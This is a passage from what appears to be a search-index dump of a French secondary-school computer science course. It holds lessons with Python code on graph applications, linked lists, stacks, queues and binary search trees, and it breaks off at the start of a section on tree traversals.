\ud83d\udc65 Exemple : R\u00e9seau Social \ud83d\udcbb Impl\u00e9mentation r\u00e9seau social <pre><code>class ReseauSocial:\n    def __init__(self):\n        self.graphe = Graphe(oriente=False)\n\n    def ajouter_personne(self, nom):\n        self.graphe.ajouter_sommet(nom)\n\n    def ajouter_amitie(self, personne1, personne2):\n        self.graphe.ajouter_arete(personne1, personne2)\n\n    def amis_communs(self, personne1, personne2):\n        \"\"\"Trouve les amis communs entre deux personnes\"\"\"\n        amis1 = {voisin for voisin, _ in self.graphe.voisins(personne1)}\n        amis2 = {voisin for voisin, _ in self.graphe.voisins(personne2)}\n        return amis1.intersection(amis2)\n\n    def suggestions_amis(self, personne):\n        \"\"\"Sugg\u00e8re des amis bas\u00e9 sur les amis d'amis\"\"\"\n        amis_directs = {voisin for voisin, _ in self.graphe.voisins(personne)}\n        suggestions = set()\n\n        for ami in amis_directs:\n            for ami_dami, _ in self.graphe.voisins(ami):\n                if ami_dami != personne and ami_dami not in amis_directs:\n                    suggestions.add(ami_dami)\n\n        return suggestions\n\n    def degre_separation(self, personne1, personne2):\n        \"\"\"Calcule le degr\u00e9 de s\u00e9paration (distance) entre deux personnes\"\"\"\n        distances, _ = dijkstra(self.graphe, personne1)\n        return distances.get(personne2, float('inf'))</code></pre>              \ud83d\udca1 Algorithme de suggestion : Bas\u00e9 sur le principe \"les amis de mes amis sont mes amis potentiels\"          \ud83d\uddfa\ufe0f Exemple : Syst\u00e8me de Navigation \ud83d\udcbb Impl\u00e9mentation GPS <pre><code>class CarteRoutiere:\n    def __init__(self):\n        self.graphe = Graphe(oriente=False)\n\n    def ajouter_route(self, ville1, ville2, distance):\n        self.graphe.ajouter_arete(ville1, ville2, distance)\n\n    def plus_court_chemin(self, depart, arrivee):\n        \"\"\"Trouve le plus court chemin entre deux villes\"\"\"\n        distances, predecesseurs = dijkstra(self.graphe, depart)\n\n        if distances[arrivee] == float('inf'):\n            return None, float('inf')\n\n        chemin = reconstruire_chemin(predecesseurs, depart, arrivee)\n        return chemin, distances[arrivee]\n\n    def itineraire_complet(self, depart, arrivee):\n        \"\"\"Retourne un itin\u00e9raire d\u00e9taill\u00e9\"\"\"\n        chemin, distance = self.plus_court_chemin(depart, arrivee)\n\n        if chemin is None:\n            return None\n\n        return {\n            'chemin': chemin,\n            'distance_totale': distance,\n            'etapes': len(chemin) - 1,\n            'villes_traversees': len(chemin)\n        }\n\n# Exemple d'utilisation\ncarte = CarteRoutiere()\ncarte.ajouter_route(\"Paris\", \"Lyon\", 465)\ncarte.ajouter_route(\"Lyon\", \"Marseille\", 315)\n\nitineraire = carte.itineraire_complet(\"Paris\", \"Marseille\")\nif itineraire:\n    print(f\"Trajet: {' \u2192 '.join(itineraire['chemin'])}\")\n    print(f\"Distance: {itineraire['distance_totale']} km\")</code></pre>              \ud83d\ude97 Optimisation r\u00e9elle : Les GPS modernes int\u00e8grent trafic, p\u00e9ages, pr\u00e9f\u00e9rences utilisateur          \u26a1 Analyse de Complexit\u00e9 \ud83d\udcca Comparaison des performances              Le choix de la repr\u00e9sentation impacte directement les performances selon les op\u00e9rations effectu\u00e9es.          Op\u00e9ration Matrice d'adjacence Liste d'adjacence Meilleur choix Ajouter sommet O(n\u00b2) O(1) Liste d'adjacence Ajouter ar\u00eate O(1) O(1) \u00c9quivalent Supprimer ar\u00eate O(1) O(degr\u00e9) Matrice d'adjacence V\u00e9rifier adjacence O(1) O(degr\u00e9) Matrice d'adjacence Parcours complet O(n\u00b2) O(n + m) Liste pour graphes peu denses Espace m\u00e9moire O(n\u00b2) O(n + m) Liste pour graphes peu denses \ud83d\udcc8 Notation Big O n = nombre de sommets m = nombre d'ar\u00eates degr\u00e9 = nombre de voisins d'un sommet V = vertices (sommets) E = edges (ar\u00eates)              \ud83c\udfaf R\u00e8gles de choix Matrice : Graphes denses, v\u00e9rifications fr\u00e9quentes Liste : Graphes peu denses, parcours fr\u00e9quents Seuil : m \u2248 n\u00b2/2 pour choisir              \ud83c\udf93 Synth\u00e8se et Conclusion \ud83c\udf1f Les graphes : une abstraction fondamentale              Les graphes constituent l'une des structures de donn\u00e9es les plus polyvalentes en informatique, permettant de mod\u00e9liser et r\u00e9soudre une multitude de probl\u00e8mes complexes.          \ud83d\udd27 Concepts Fondamentaux \u2022 Structure : Sommets + Ar\u00eates \u2022 Types : Orient\u00e9/Non-orient\u00e9, Pond\u00e9r\u00e9 \u2022 Repr\u00e9sentations : Matrice vs Liste \u2022 Flexibilit\u00e9 : Adaptation au contexte              \ud83d\ude80 Algorithmes Essentiels \u2022 Parcours : BFS (largeur) et DFS (profondeur) \u2022 Chemins : Dijkstra pour plus courts chemins \u2022 Analyse : D\u00e9tection de cycles, connectivit\u00e9 \u2022 Complexit\u00e9 : O(V + E) pour la plupart              \ud83c\udf0d Applications R\u00e9elles \u2022 R\u00e9seaux sociaux : Relations, suggestions \u2022 Navigation : GPS, optimisation de trajets \u2022 Internet : Routage, pages web \u2022 IA : Recherche, planification              \u2696\ufe0f Choix Strat\u00e9giques \u2022 Densit\u00e9 : Crit\u00e8re de choix principal \u2022 Op\u00e9rations : Fr\u00e9quence d'utilisation \u2022 M\u00e9moire : Contraintes d'espace \u2022 Performance : Optimisation cibl\u00e9e              \ud83c\udfaf Points Cl\u00e9s \u00e0 Retenir              \ud83e\udde0 Mod\u00e9lisation : Identifier les entit\u00e9s (sommets) et leurs relations (ar\u00eates) est la premi\u00e8re \u00e9tape cruciale                       \u26a1 Performance : Le choix matrice vs liste d\u00e9pend de la densit\u00e9 : liste pour graphes peu denses (m &lt;&lt; n\u00b2)                       \ud83d\udd0d Algorithmes : BFS pour distances minimales, DFS pour exploration exhaustive et d\u00e9tection de cycles                       \ud83c\udf10 Universalit\u00e9 : Les graphes sont omnipr\u00e9sents : du GPS aux r\u00e9seaux sociaux, en passant par l'IA                       \ud83d\ude80 \u00c9volutivit\u00e9 : Les algorithmes sur graphes s'adaptent naturellement aux gros volumes de donn\u00e9es          \ud83d\udd2e Perspectives d'approfondissement Algorithmes avanc\u00e9s : Bellman-Ford, Floyd-Warshall, Kruskal, Prim Graphes sp\u00e9cialis\u00e9s : Arbres, DAG, graphes bipartites Applications avanc\u00e9es : Machine Learning, analyse de r\u00e9seaux, optimisation"},{"location":"terminale/II-Structures_de_donnees/Cours/listes_piles_files/","title":"Listes, Piles et Files","text":""},{"location":"terminale/II-Structures_de_donnees/Cours/listes_piles_files/#introduction","title":"Introduction","text":"<p>Les structures de donn\u00e9es lin\u00e9aires sont des collections d'\u00e9l\u00e9ments organis\u00e9s de mani\u00e8re s\u00e9quentielle. En terminale NSI, nous approfondissons l'\u00e9tude de trois structures fondamentales : les listes, les piles et les files. Ces structures constituent la base de nombreux algorithmes et sont essentielles pour comprendre l'organisation des donn\u00e9es en informatique.</p> <p>Rappel de premi\u00e8re</p> <p>En premi\u00e8re, nous avons \u00e9tudi\u00e9 les listes Python et les tuples. En terminale, nous nous concentrons sur l'interface et l'impl\u00e9mentation de ces structures de donn\u00e9es abstraites.</p>"},{"location":"terminale/II-Structures_de_donnees/Cours/listes_piles_files/#types-abstraits-de-donnees-tad","title":"Types abstraits de donn\u00e9es (TAD)","text":"<p>D\u00e9finition : Un type abstrait de donn\u00e9es (TAD) est une sp\u00e9cification qui d\u00e9finit : - Les donn\u00e9es que peut contenir la structure - Les op\u00e9rations possibles sur ces donn\u00e9es - Le comportement attendu de ces op\u00e9rations</p> <p>Un TAD s\u00e9pare l'interface (ce que fait la structure) de l'impl\u00e9mentation (comment elle le fait).</p>"},{"location":"terminale/II-Structures_de_donnees/Cours/listes_piles_files/#interface-vs-implementation","title":"Interface vs Impl\u00e9mentation","text":"<ul> <li>Interface : Ensemble des op\u00e9rations disponibles et leur sp\u00e9cification</li> <li>Impl\u00e9mentation : Fa\u00e7on concr\u00e8te de r\u00e9aliser ces op\u00e9rations en m\u00e9moire</li> </ul> <p>Analogie</p> <p>Une voiture a une interface (volant, p\u00e9dales, levier de vitesse) qui reste la m\u00eame, mais l'impl\u00e9mentation peut varier (moteur essence, \u00e9lectrique, hybride).</p>"},{"location":"terminale/II-Structures_de_donnees/Cours/listes_piles_files/#les-listes","title":"Les Listes","text":""},{"location":"terminale/II-Structures_de_donnees/Cours/listes_piles_files/#definition-et-interface","title":"D\u00e9finition et interface","text":"<p>Une liste est une structure de donn\u00e9es lin\u00e9aire qui permet de stocker une s\u00e9quence d'\u00e9l\u00e9ments accessibles par leur position (indice).</p> <p>Interface d'une liste : - <code>creer_liste()</code> : cr\u00e9er une liste vide - <code>est_vide(liste)</code> : tester si la liste est vide - <code>taille(liste)</code> : obtenir le nombre d'\u00e9l\u00e9ments - <code>acceder(liste, i)</code> : acc\u00e9der \u00e0 l'\u00e9l\u00e9ment d'indice i - <code>modifier(liste, i, element)</code> : modifier l'\u00e9l\u00e9ment d'indice i - <code>inserer(liste, i, element)</code> : ins\u00e9rer un \u00e9l\u00e9ment \u00e0 la position i - <code>supprimer(liste, i)</code> : supprimer l'\u00e9l\u00e9ment \u00e0 la position i</p>"},{"location":"terminale/II-Structures_de_donnees/Cours/listes_piles_files/#implementations-possibles","title":"Impl\u00e9mentations possibles","text":""},{"location":"terminale/II-Structures_de_donnees/Cours/listes_piles_files/#1-tableau-dynamique-comme-les-listes-python","title":"1. Tableau dynamique (comme les listes Python)","text":"<pre><code>class ListeTableau:\n    def __init__(self):\n        self.elements = []\n\n    def est_vide(self):\n        return len(self.elements) == 0\n\n    def taille(self):\n        return len(self.elements)\n\n    def acceder(self, i):\n        if 0 &lt;= i &lt; len(self.elements):\n            return self.elements[i]\n        raise IndexError(\"Indice hors limites\")\n\n    def modifier(self, i, element):\n        if 0 &lt;= i &lt; len(self.elements):\n            self.elements[i] = element\n        else:\n            raise IndexError(\"Indice hors limites\")\n\n    def inserer(self, i, element):\n        self.elements.insert(i, element)\n\n    def supprimer(self, i):\n        if 0 &lt;= i &lt; len(self.elements):\n            return self.elements.pop(i)\n        raise IndexError(\"Indice hors limites\")\n</code></pre>"},{"location":"terminale/II-Structures_de_donnees/Cours/listes_piles_files/#2-liste-chainee","title":"2. Liste cha\u00een\u00e9e","text":"<pre><code>class Noeud:\n    def __init__(self, valeur, suivant=None):\n        self.valeur = valeur\n        self.suivant = suivant\n\nclass ListeChainee:\n    def __init__(self):\n        self.tete = None\n        self._taille = 0\n\n    def est_vide(self):\n        return self.tete is None\n\n    def taille(self):\n        return self._taille\n\n    def acceder(self, i):\n        if i &lt; 0 or i &gt;= self._taille:\n            raise IndexError(\"Indice hors limites\")\n\n        noeud_courant = self.tete\n        for _ in range(i):\n            noeud_courant = noeud_courant.suivant\n        return noeud_courant.valeur\n\n    def inserer(self, i, element):\n        if i &lt; 0 or i &gt; self._taille:\n            raise IndexError(\"Indice hors limites\")\n\n        nouveau_noeud = Noeud(element)\n\n        if i == 0:\n            nouveau_noeud.suivant = self.tete\n            self.tete = nouveau_noeud\n        else:\n            noeud_courant = self.tete\n            for _ in range(i - 1):\n                noeud_courant = noeud_courant.suivant\n            nouveau_noeud.suivant = noeud_courant.suivant\n            noeud_courant.suivant = nouveau_noeud\n\n        self._taille += 1\n</code></pre>"},{"location":"terminale/II-Structures_de_donnees/Cours/listes_piles_files/#les-piles-stack","title":"Les Piles (Stack)","text":""},{"location":"terminale/II-Structures_de_donnees/Cours/listes_piles_files/#definition-et-principe-lifo","title":"D\u00e9finition et principe LIFO","text":"<p>Une pile est une structure de donn\u00e9es qui suit le principe LIFO (Last In, First Out) : le dernier \u00e9l\u00e9ment ajout\u00e9 est le premier \u00e0 \u00eatre retir\u00e9.</p> <p>Analogie</p> <p>Une pile d'assiettes : on ne peut ajouter ou retirer des assiettes que par le dessus.</p>"},{"location":"terminale/II-Structures_de_donnees/Cours/listes_piles_files/#interface-dune-pile","title":"Interface d'une pile","text":"<ul> <li><code>creer_pile()</code> : cr\u00e9er une pile vide</li> <li><code>est_vide(pile)</code> : tester si la pile est vide</li> <li><code>empiler(pile, element)</code> : ajouter un \u00e9l\u00e9ment au sommet (push)</li> <li><code>depiler(pile)</code> : retirer et retourner l'\u00e9l\u00e9ment du sommet (pop)</li> <li><code>sommet(pile)</code> : consulter l'\u00e9l\u00e9ment du sommet sans le retirer (peek)</li> </ul>"},{"location":"terminale/II-Structures_de_donnees/Cours/listes_piles_files/#implementation-avec-une-liste-python","title":"Impl\u00e9mentation avec une liste Python","text":"<pre><code>class Pile:\n    def __init__(self):\n        self.elements = []\n\n    def est_vide(self):\n        return len(self.elements) == 0\n\n    def empiler(self, element):\n        self.elements.append(element)\n\n    def depiler(self):\n        if self.est_vide():\n            raise IndexError(\"Pile vide\")\n        return self.elements.pop()\n\n    def sommet(self):\n        if self.est_vide():\n            raise IndexError(\"Pile vide\")\n        return self.elements[-1]\n\n    def taille(self):\n        return len(self.elements)\n</code></pre>"},{"location":"terminale/II-Structures_de_donnees/Cours/listes_piles_files/#applications-des-piles","title":"Applications des piles","text":"<ol> <li>Gestion des appels de fonctions : pile d'ex\u00e9cution</li> <li>\u00c9valuation d'expressions : notation polonaise inverse</li> <li>Parcours en profondeur dans les graphes</li> <li>Annulation d'op\u00e9rations (Ctrl+Z)</li> <li>V\u00e9rification de parenth\u00e9sage</li> </ol> <pre><code>def parentheses_equilibrees(expression):\n    \"\"\"V\u00e9rifie si les parenth\u00e8ses sont \u00e9quilibr\u00e9es dans une expression\"\"\"\n    pile = Pile()\n\n    for caractere in expression:\n        if caractere in \"([{\":\n            pile.empiler(caractere)\n        elif caractere in \")]}\":\n            if pile.est_vide():\n                return False\n            ouvrante = pile.depiler()\n            if not correspond(ouvrante, caractere):\n                return False\n\n    return pile.est_vide()\n\ndef correspond(ouvrante, fermante):\n    \"\"\"V\u00e9rifie si une parenth\u00e8se ouvrante correspond \u00e0 une fermante\"\"\"\n    couples = {'(': ')', '[': ']', '{': '}'}\n    return couples.get(ouvrante) == fermante\n</code></pre>"},{"location":"terminale/II-Structures_de_donnees/Cours/listes_piles_files/#les-files-queue","title":"Les Files (Queue)","text":""},{"location":"terminale/II-Structures_de_donnees/Cours/listes_piles_files/#definition-et-principe-fifo","title":"D\u00e9finition et principe FIFO","text":"<p>Une file est une structure de donn\u00e9es qui suit le principe FIFO (First In, First Out) : le premier \u00e9l\u00e9ment ajout\u00e9 est le premier \u00e0 \u00eatre retir\u00e9.</p> <p>Analogie</p> <p>Une file d'attente : les personnes sont servies dans l'ordre d'arriv\u00e9e.</p>"},{"location":"terminale/II-Structures_de_donnees/Cours/listes_piles_files/#interface-dune-file","title":"Interface d'une file","text":"<ul> <li><code>creer_file()</code> : cr\u00e9er une file vide</li> <li><code>est_vide(file)</code> : tester si la file est vide</li> <li><code>enfiler(file, element)</code> : ajouter un \u00e9l\u00e9ment \u00e0 la fin (enqueue)</li> <li><code>defiler(file)</code> : retirer et retourner l'\u00e9l\u00e9ment du d\u00e9but (dequeue)</li> <li><code>premier(file)</code> : consulter l'\u00e9l\u00e9ment du d\u00e9but sans le retirer</li> </ul>"},{"location":"terminale/II-Structures_de_donnees/Cours/listes_piles_files/#implementation-avec-une-liste-python_1","title":"Impl\u00e9mentation avec une liste Python","text":"<pre><code>class File:\n    def __init__(self):\n        self.elements = []\n\n    def est_vide(self):\n        return len(self.elements) == 0\n\n    def enfiler(self, element):\n        self.elements.append(element)\n\n    def defiler(self):\n        if self.est_vide():\n            raise IndexError(\"File vide\")\n        return self.elements.pop(0)  # Attention : co\u00fbt O(n)\n\n    def premier(self):\n        if self.est_vide():\n            raise IndexError(\"File vide\")\n        return self.elements[0]\n\n    def taille(self):\n        return len(self.elements)\n</code></pre> <p>Complexit\u00e9</p> <p>L'impl\u00e9mentation ci-dessus a un co\u00fbt O(n) pour <code>defiler()</code> car il faut d\u00e9caler tous les \u00e9l\u00e9ments. Une impl\u00e9mentation plus efficace utiliserait deux indices ou une liste cha\u00een\u00e9e.</p>"},{"location":"terminale/II-Structures_de_donnees/Cours/listes_piles_files/#implementation-optimisee-avec-deux-indices","title":"Impl\u00e9mentation optimis\u00e9e avec deux indices","text":"<pre><code>class FileOptimisee:\n    def __init__(self):\n        self.elements = []\n        self.debut = 0\n\n    def est_vide(self):\n        return self.debut &gt;= len(self.elements)\n\n    def enfiler(self, element):\n        self.elements.append(element)\n\n    def defiler(self):\n        if self.est_vide():\n            raise IndexError(\"File vide\")\n        element = self.elements[self.debut]\n        self.debut += 1\n\n        # R\u00e9organiser p\u00e9riodiquement pour \u00e9viter la croissance infinie\n        if self.debut &gt; len(self.elements) // 2:\n            self.elements = self.elements[self.debut:]\n            self.debut = 0\n\n        return element\n\n    def premier(self):\n        if self.est_vide():\n            raise IndexError(\"File vide\")\n        return self.elements[self.debut]\n</code></pre>"},{"location":"terminale/II-Structures_de_donnees/Cours/listes_piles_files/#applications-des-files","title":"Applications des files","text":"<ol> <li>Gestion des processus dans les syst\u00e8mes d'exploitation</li> <li>Parcours en largeur dans les graphes</li> <li>Gestion des requ\u00eates dans les serveurs web</li> <li>Simulation de files d'attente</li> <li>Algorithmes de planification</li> </ol>"},{"location":"terminale/II-Structures_de_donnees/Cours/listes_piles_files/#comparaison-des-structures","title":"Comparaison des structures","text":"Structure Principe Ajout Suppression Acc\u00e8s Liste Acc\u00e8s index\u00e9 Partout Partout Par indice Pile LIFO Sommet Sommet Sommet uniquement File FIFO Fin D\u00e9but D\u00e9but uniquement"},{"location":"terminale/II-Structures_de_donnees/Cours/listes_piles_files/#complexite-temporelle","title":"Complexit\u00e9 temporelle","text":""},{"location":"terminale/II-Structures_de_donnees/Cours/listes_piles_files/#tableau-dynamique-liste-python","title":"Tableau dynamique (liste Python)","text":"<ul> <li>Acc\u00e8s : O(1)</li> <li>Insertion/suppression en fin : O(1) amorti</li> <li>Insertion/suppression au milieu : O(n)</li> </ul>"},{"location":"terminale/II-Structures_de_donnees/Cours/listes_piles_files/#liste-chainee","title":"Liste cha\u00een\u00e9e","text":"<ul> <li>Acc\u00e8s : O(n)</li> <li>Insertion/suppression en t\u00eate : O(1)</li> <li>Insertion/suppression au milieu : O(n) pour trouver + O(1) pour modifier</li> </ul>"},{"location":"terminale/II-Structures_de_donnees/Cours/listes_piles_files/#pile-avec-liste-python","title":"Pile (avec liste Python)","text":"<ul> <li>Empiler : O(1)</li> <li>D\u00e9piler : O(1)</li> <li>Consulter le sommet : O(1)</li> </ul>"},{"location":"terminale/II-Structures_de_donnees/Cours/listes_piles_files/#file-avec-liste-python-naive","title":"File (avec liste Python na\u00efve)","text":"<ul> <li>Enfiler : O(1)</li> <li>D\u00e9filer : O(n)</li> <li>Consulter le premier : O(1)</li> </ul>"},{"location":"terminale/II-Structures_de_donnees/Cours/listes_piles_files/#file-avec-implementation-optimisee","title":"File (avec impl\u00e9mentation optimis\u00e9e)","text":"<ul> <li>Enfiler : O(1)</li> <li>D\u00e9filer : O(1) amorti</li> <li>Consulter le premier : O(1)</li> </ul>"},{"location":"terminale/II-Structures_de_donnees/Cours/listes_piles_files/#conclusion","title":"Conclusion","text":"<p>Les structures de donn\u00e9es lin\u00e9aires sont fondamentales en informatique. Le choix entre liste, pile ou file d\u00e9pend du probl\u00e8me \u00e0 r\u00e9soudre :</p> <ul> <li>Liste : quand on a besoin d'un acc\u00e8s al\u00e9atoire aux \u00e9l\u00e9ments</li> <li>Pile : pour g\u00e9rer des \u00e9l\u00e9ments dans l'ordre inverse d'arriv\u00e9e</li> <li>File : pour traiter des \u00e9l\u00e9ments dans l'ordre d'arriv\u00e9e</li> </ul> <p>La compr\u00e9hension de ces structures et de leurs impl\u00e9mentations est essentielle pour concevoir des algorithmes efficaces et comprendre le fonctionnement des syst\u00e8mes informatiques.</p>"},{"location":"terminale/II-Structures_de_donnees/Cours/Arbre/arbres_binaires_recherche/","title":"\ud83d\udd0d Arbres Binaires de Recherche (ABR)","text":"\ud83c\udfaf D\u00e9finition et Propri\u00e9t\u00e9s \ud83d\udd0d Arbre Binaire de Recherche              Un Arbre Binaire de Recherche (ABR) est un arbre binaire qui respecte la propri\u00e9t\u00e9 d'ordre :             <ul> <li>Toutes les valeurs du sous-arbre gauche sont inf\u00e9rieures \u00e0 la racine</li> <li>Toutes les valeurs du sous-arbre droit sont sup\u00e9rieures \u00e0 la racine</li> <li>Cette propri\u00e9t\u00e9 s'applique r\u00e9cursivement \u00e0 tous les sous-arbres</li> </ul> \ud83d\udcca Propri\u00e9t\u00e9 d'Ordre                  La structure maintient automatiquement un ordre qui permet des recherches efficaces en O(log n).              \u26a1 Efficacit\u00e9                  Recherche, insertion et suppression en O(log n) dans le cas \u00e9quilibr\u00e9, O(n) dans le pire cas.              \ud83d\udd04 Parcours Infixe                  Le parcours infixe d'un ABR produit automatiquement les valeurs en ordre croissant.              \ud83d\udd0d Op\u00e9ration de Recherche \ud83c\udfaf Principe de la Recherche              La recherche exploite la propri\u00e9t\u00e9 d'ordre pour \u00e9liminer la moiti\u00e9 des possibilit\u00e9s \u00e0 chaque \u00e9tape, similaire \u00e0 la recherche dichotomique.          \ud83d\udd0d Recherche dans un ABR                  Algorithme r\u00e9cursif qui compare la valeur recherch\u00e9e avec le n\u0153ud courant.              \ud83d\udcbb Impl\u00e9mentation Recherche <pre><code>def rechercher(self, valeur, noeud=None):\n    \"\"\"\n    Recherche une valeur dans l'ABR\n    Retourne True si trouv\u00e9e, False sinon\n    \"\"\"\n    if noeud is None:\n        noeud = self.racine\n\n    # Cas de base : n\u0153ud vide\n    if noeud is None:\n        return False\n\n    # Valeur trouv\u00e9e\n    if valeur == noeud.valeur:\n        return True\n\n    # Recherche dans le sous-arbre appropri\u00e9\n    elif valeur &lt; noeud.valeur:\n        return self.rechercher(valeur, noeud.gauche)\n    else:\n        return self.rechercher(valeur, noeud.droite)</code></pre> \ud83d\udccd Recherche avec N\u0153ud                  Version qui retourne le n\u0153ud trouv\u00e9 plut\u00f4t qu'un bool\u00e9en.              \ud83d\udcbb Recherche Avanc\u00e9e <pre><code>def rechercher_noeud(self, valeur, noeud=None):\n    \"\"\"\n    Recherche et retourne le n\u0153ud contenant la valeur\n    Retourne None si non trouv\u00e9\n    \"\"\"\n    if noeud is None:\n        noeud = self.racine\n\n    if noeud is None or noeud.valeur == valeur:\n        return noeud\n\n    if valeur &lt; noeud.valeur:\n        return self.rechercher_noeud(valeur, noeud.gauche)\n    else:\n        return self.rechercher_noeud(valeur, noeud.droite)</code></pre> \u2795 Op\u00e9ration d'Insertion \ud83d\udce5 Principe de l'Insertion              L'insertion trouve la position correcte en suivant la propri\u00e9t\u00e9 d'ordre, puis ajoute le nouveau n\u0153ud comme feuille.          \u2795 Insertion dans un ABR                  Algorithme r\u00e9cursif qui maintient la propri\u00e9t\u00e9 d'ordre lors de l'ajout.              \ud83d\udcbb Impl\u00e9mentation Insertion <pre><code>def inserer(self, valeur, noeud=None):\n    \"\"\"\n    Ins\u00e8re une valeur dans l'ABR en maintenant la propri\u00e9t\u00e9 d'ordre\n    Retourne la racine du sous-arbre modifi\u00e9\n    \"\"\"\n    # Premier appel : initialiser avec la racine\n    if noeud is None and self.racine is not None:\n        self.racine = self._inserer_recursif(valeur, self.racine)\n        return\n\n    # Arbre vide : cr\u00e9er la racine\n    if self.racine is None:\n        self.racine = NoeudBinaire(valeur)\n        return\n\n    self.racine = self._inserer_recursif(valeur, self.racine)\n\ndef _inserer_recursif(self, valeur, noeud):\n    \"\"\"\n    M\u00e9thode auxiliaire r\u00e9cursive pour l'insertion\n    \"\"\"\n    # Cas de base : position trouv\u00e9e\n    if noeud is None:\n        return NoeudBinaire(valeur)\n\n    # Insertion selon la propri\u00e9t\u00e9 d'ordre\n    if valeur &lt; noeud.valeur:\n        noeud.gauche = self._inserer_recursif(valeur, noeud.gauche)\n    elif valeur &gt; noeud.valeur:\n        noeud.droite = self._inserer_recursif(valeur, noeud.droite)\n    # Si valeur == noeud.valeur, on ne fait rien (pas de doublons)\n\n    return noeud</code></pre> \ud83c\udfd7\ufe0f Exemple d'Insertion                  Construction progressive d'un ABR par insertions successives.              \ud83d\udcbb Construction d'ABR <pre><code># Cr\u00e9ation et construction d'un ABR\nabr = ArbreBinaireRecherche()\n\n# Insertions successives\nvaleurs = [50, 30, 70, 20, 40, 60, 80]\nfor valeur in valeurs:\n    abr.inserer(valeur)\n\n# R\u00e9sultat :\n#       50\n#      /  \\\n#     30   70\n#    / \\   / \\\n#   20 40 60 80\n\nprint(\"ABR construit avec succ\u00e8s\")\nprint(\"Parcours infixe :\", abr.parcours_infixe())  # [20, 30, 40, 50, 60, 70, 80]</code></pre> \u2796 Op\u00e9ration de Suppression \ud83d\uddd1\ufe0f Principe de la Suppression              La suppression est l'op\u00e9ration la plus complexe car elle doit maintenir la propri\u00e9t\u00e9 d'ordre apr\u00e8s avoir retir\u00e9 un n\u0153ud. Trois cas distincts existent selon le nombre d'enfants du n\u0153ud \u00e0 supprimer.          1\ufe0f\u20e3 Cas 1 : Feuille N\u0153ud sans enfants                 Suppression directe - le plus simple des trois cas.              2\ufe0f\u20e3 Cas 2 : Un Enfant N\u0153ud avec un seul enfant                 Remplacer le n\u0153ud par son unique enfant.              3\ufe0f\u20e3 Cas 3 : Deux Enfants N\u0153ud avec deux enfants                 Remplacer par le successeur (ou pr\u00e9d\u00e9cesseur) dans l'ordre infixe.              \ud83d\uddd1\ufe0f Suppression Compl\u00e8te                  Impl\u00e9mentation g\u00e9rant les trois cas de suppression.              \ud83d\udcbb Impl\u00e9mentation Suppression <pre><code>def supprimer(self, valeur):\n    \"\"\"\n    Supprime une valeur de l'ABR\n    \"\"\"\n    self.racine = self._supprimer_recursif(valeur, self.racine)\n\ndef _supprimer_recursif(self, valeur, noeud):\n    \"\"\"\n    M\u00e9thode auxiliaire r\u00e9cursive pour la suppression\n    \"\"\"\n    # Cas de base : valeur non trouv\u00e9e\n    if noeud is None:\n        return noeud\n\n    # Recherche du n\u0153ud \u00e0 supprimer\n    if valeur &lt; noeud.valeur:\n        noeud.gauche = self._supprimer_recursif(valeur, noeud.gauche)\n    elif valeur &gt; noeud.valeur:\n        noeud.droite = self._supprimer_recursif(valeur, noeud.droite)\n    else:\n        # N\u0153ud trouv\u00e9 - traiter les 3 cas\n\n        # Cas 1 : N\u0153ud feuille (aucun enfant)\n        if noeud.gauche is None and noeud.droite is None:\n            return None\n\n        # Cas 2a : Seulement enfant droit\n        elif noeud.gauche is None:\n            return noeud.droite\n\n        # Cas 2b : Seulement enfant gauche\n        elif noeud.droite is None:\n            return noeud.gauche\n\n        # Cas 3 : Deux enfants\n        else:\n            # Trouver le successeur (minimum du sous-arbre droit)\n            successeur = self._trouver_minimum(noeud.droite)\n\n            # Remplacer la valeur du n\u0153ud par celle du successeur\n            noeud.valeur = successeur.valeur\n\n            # Supprimer le successeur\n            noeud.droite = self._supprimer_recursif(successeur.valeur, noeud.droite)\n\n    return noeud\n\ndef _trouver_minimum(self, noeud):\n    \"\"\"\n    Trouve le n\u0153ud avec la valeur minimale dans un sous-arbre\n    \"\"\"\n    while noeud.gauche is not None:\n        noeud = noeud.gauche\n    return noeud</code></pre> \ud83d\udcdd Exemple de Suppression                  D\u00e9monstration des diff\u00e9rents cas de suppression.              \ud83d\udcbb Test de Suppression <pre><code># ABR initial : [20, 30, 40, 50, 60, 70, 80]\n#       50\n#      /  \\\n#     30   70\n#    / \\   / \\\n#   20 40 60 80\n\n# Cas 1 : Supprimer une feuille (20)\nabr.supprimer(20)\nprint(\"Apr\u00e8s suppression de 20 :\", abr.parcours_infixe())  # [30, 40, 50, 60, 70, 80]\n\n# Cas 2 : Supprimer un n\u0153ud avec un enfant (30)\nabr.supprimer(30)\nprint(\"Apr\u00e8s suppression de 30 :\", abr.parcours_infixe())  # [40, 50, 60, 70, 80]\n\n# Cas 3 : Supprimer un n\u0153ud avec deux enfants (50 - racine)\nabr.supprimer(50)\nprint(\"Apr\u00e8s suppression de 50 :\", abr.parcours_infixe())  # [40, 60, 70, 80]</code></pre> \ud83d\udcca Analyse de Complexit\u00e9 \u26a1 Complexit\u00e9s des Op\u00e9rations ABR Op\u00e9ration Cas Moyen Pire Cas Remarques Recherche O(log n) O(n) Arbre \u00e9quilibr\u00e9 vs d\u00e9g\u00e9n\u00e9r\u00e9 Insertion O(log n) O(n) D\u00e9pend de l'ordre d'insertion Suppression O(log n) O(n) Cas 3 le plus complexe Parcours O(n) O(n) Visite tous les n\u0153uds          \u26a1 Avantage cl\u00e9 : Un ABR \u00e9quilibr\u00e9 offre des op\u00e9rations en O(log n), soit une efficacit\u00e9 comparable \u00e0 la recherche dichotomique sur un tableau tri\u00e9, mais avec l'avantage d'insertions et suppressions dynamiques efficaces.      \ud83c\udfaf Points Cl\u00e9s \u00e0 Retenir \ud83d\udcca Propri\u00e9t\u00e9 Fondamentale                  La propri\u00e9t\u00e9 d'ordre (gauche &lt; racine &lt; droite) est la cl\u00e9 de l'efficacit\u00e9 des ABR et doit \u00eatre maintenue \u00e0 tout moment.              \u26a1 Performance Optimale                  Les ABR \u00e9quilibr\u00e9s offrent O(log n) pour les op\u00e9rations principales, mais peuvent d\u00e9g\u00e9n\u00e9rer en O(n) si mal construits.              \ud83d\udd04 Tri Automatique                  Le parcours infixe d'un ABR produit automatiquement les valeurs en ordre croissant, offrant un tri efficace.              \ud83d\uddd1\ufe0f Suppression Complexe                  La suppression n\u00e9cessite une attention particuli\u00e8re aux trois cas possibles pour maintenir la structure et les propri\u00e9t\u00e9s de l'ABR."},{"location":"terminale/II-Structures_de_donnees/Cours/Arbre/parcours_arbres/","title":"\ud83c\udf33 Parcours d'Arbres","text":"\ud83c\udfaf Introduction aux Parcours \ud83d\udeb6 Parcours d'arbre              Un parcours d'arbre est une m\u00e9thode 